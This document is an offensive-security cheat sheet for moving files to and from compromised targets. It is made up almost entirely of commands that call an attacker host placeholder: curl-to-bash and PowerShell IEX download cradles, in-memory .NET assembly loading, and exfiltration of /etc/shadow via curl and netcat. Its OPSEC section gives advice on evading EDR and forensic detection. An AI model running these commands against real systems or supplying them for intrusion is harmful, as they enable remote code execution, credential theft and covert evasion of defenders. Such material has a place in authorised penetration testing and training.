# File Transfer Cheat Sheet

> Move files to/from a target without scp / sftp. Universally needed
> for delivering exploits, exfiltrating loot, and staging tools.

## Attacker-side server

Pick one based on what's installed on the *target*:

```bash
# HTTP — works everywhere
sudo python3 -m http.server 80
# → target uses curl / wget / Invoke-WebRequest / certutil

# HTTPS (when egress filtering snoops port 80)
python3 -c '
import http.server, ssl
h = http.server.HTTPServer(("0.0.0.0", 443), http.server.SimpleHTTPRequestHandler)
h.socket = ssl.wrap_socket(h.socket, certfile="cert.pem", keyfile="key.pem", server_side=True)
h.serve_forever()
'

# SMB — works for Windows targets without firewall hops
sudo impacket-smbserver share .   # serves cwd as \\<atk>\share

# FTP — when SMB / HTTP blocked
python3 -m pyftpdlib -p 21 -d .

# TFTP — old but works on minimal embedded
sudo atftpd --daemon --port 69 .

# NFS — Linux target
sudo apt install nfs-kernel-server
echo '/srv/nfs *(rw,sync,no_root_squash,no_subtree_check)' | sudo tee /etc/exports
sudo systemctl restart nfs-server

# Netcat receive
nc -lvnp 4444 > received.bin       # attacker
cat sendme.bin | nc <atk> 4444     # victim sends
```

## Target-side download

### Linux

```bash
# wget
wget http://<atk>/file -O /tmp/file

# curl (often present, sometimes wget isn't)
curl -O http://<atk>/file
curl -s http://<atk>/file -o /tmp/file

# bash redirection (no wget/curl)
exec 3<>/dev/tcp/<atk>/80; echo -e "GET /file HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/file

# python download
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<atk>/file','/tmp/file')"
python -c "import urllib; urllib.urlretrieve('http://<atk>/file','/tmp/file')"

# scp — when target has SSH client
scp file user@<atk>:/dest

# nc receive
nc -lvnp 4444 > /tmp/file              # victim (rare; usually attacker side)

# fileless exec — direct curl-to-bash (when caching disk is risky)
curl -s http://<atk>/x.sh | bash
```

### Windows

```powershell
# IWR / Invoke-WebRequest (PS ≥ 3)
Invoke-WebRequest -Uri http://<atk>/file -OutFile C:\Windows\Temp\file
iwr http://<atk>/file -OutFile $env:TEMP\file -UseBasicParsing

# WebClient (works on older PS)
(New-Object Net.WebClient).DownloadFile("http://<atk>/file","C:\Windows\Temp\file")

# bitsadmin (loud; logged)
bitsadmin /transfer myJob /download /priority normal http://<atk>/file C:\Windows\Temp\file

# certutil (lol)
certutil.exe -urlcache -f http://<atk>/file C:\Windows\Temp\file
certutil.exe -split -f -urlcache http://<atk>/file file

# SMB — works with attacker-side impacket-smbserver
copy \\<atk>\share\file C:\Windows\Temp\file
robocopy \\<atk>\share C:\Windows\Temp\ file

# PowerShell download cradle (in-memory exec, no disk artefact)
IEX (New-Object Net.WebClient).DownloadString('http://<atk>/p.ps1')
iex (iwr http://<atk>/p.ps1 -UseBasicParsing).Content
```

## Target-side upload (exfil)

### Linux

```bash
# curl PUT to attacker python server
curl -X PUT --upload-file /etc/shadow http://<atk>/up

# nc send
cat /etc/shadow | nc <atk> 4444

# scp upload (target has SSH client + you have key)
scp /etc/shadow user@<atk>:/loot/
```

### Windows

```powershell
# PowerShell upload via WebClient
$wc = New-Object Net.WebClient
$wc.UploadFile('http://<atk>:8000/up','PUT','C:\Windows\Temp\file')

# evil-winrm `download` command (works with active session)
download C:\Windows\Temp\file /local/path

# SMB upload (target writes to attacker share)
copy C:\Windows\Temp\file \\<atk>\share\
```

## In-memory delivery (no disk artefact)

```powershell
# PowerShell — execute remote code without writing
IEX (New-Object Net.WebClient).DownloadString('http://<atk>/x.ps1')

# .NET reflection — load an assembly into memory
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<atk>/x.dll'))
```

## Encoded delivery (when network access is restricted)

```bash
# base64-encode locally, paste into target
base64 -w0 binary > b64.txt
# paste into target shell:
echo '<huge-b64-string>' | base64 -d > /tmp/binary
```

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Server on wrong interface | Target can't connect | Bind to `tun0` IP, not localhost |
| Uppercase wget alias on Windows | "wget : command not found" | Use IWR or DownloadFile |
| Forgetting `chmod +x` | "Permission denied" on Linux | `chmod +x` after download |
| Antivirus deletes during download | Empty file appears | Use in-memory exec (IEX) |
| Long base64 strings exceeding shell line buffer | Garbled output | Split into chunks; reassemble |
| Forgetting `-UseBasicParsing` on Server Core | IWR hangs | Add the flag |

## OPSEC

- HTTP downloads of `*.exe` are flagged by EDR. Rename to `update.bin`
  or use `certutil`-encoded delivery.
- `bitsadmin` and `certutil` for downloads are themselves IOCs.
- Stick to `IEX` / `Invoke-Expression` for in-memory code; no disk
  artefact reduces forensic risk.
- SMB transfers from `\\<atk>\share` light up egress monitoring.

## Related Skills

- [`reverse-shells/cheat-sheet.md`](../reverse-shells/cheat-sheet.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`tunneling/chisel.md`](../tunneling/chisel.md)
- [`methodology/12-shell-stabilization.md`](../methodology/12-shell-stabilization.md)
